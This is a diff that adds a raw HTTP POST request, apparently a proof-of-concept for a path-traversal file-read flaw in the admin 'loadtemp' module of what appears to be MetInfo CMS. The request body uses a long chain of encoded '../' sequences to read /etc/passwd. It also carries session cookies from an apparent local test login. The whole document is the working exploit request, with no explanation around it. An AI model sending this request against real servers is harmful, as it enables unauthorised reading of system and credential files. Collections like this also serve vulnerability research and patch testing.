@@ -1,0 +1,17 @@
+POST /admin/?m=include&c=loadtemp&a=doviewhtml HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 97
+Origin: http://127.0.0.1
+Connection: close
+Referer: http://127.0.0.1/admin/
+Cookie: re_url=http%3A%2F%2F127.0.0.1%2Fadmin%2F; PHPSESSID=55284949d171d2abaa7f1f3009956772; met_auth=07c0zUx5sGqDm10aDgHMjUlRab7wYGDp5f1qGMMeMnODIssnceBhTrxs5joF8wUkcwYmo%2F2Y8i2ebCdqjR%2FH0tOVZg; met_key=bP3S6VR; admin_lang=cn; page_iframe_url=http%3A%2F%2F127.0.0.1%2Findex.php%3Flang%3Dcn%26pageset%3D1; Hm_lvt_520556228c0113270c0c772027905838=1583816922; Hm_lpvt_520556228c0113270c0c772027905838=1583818457; arrlanguage=metinfo
+Pragma: no-cache
+Cache-Control: no-cache
+
+path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
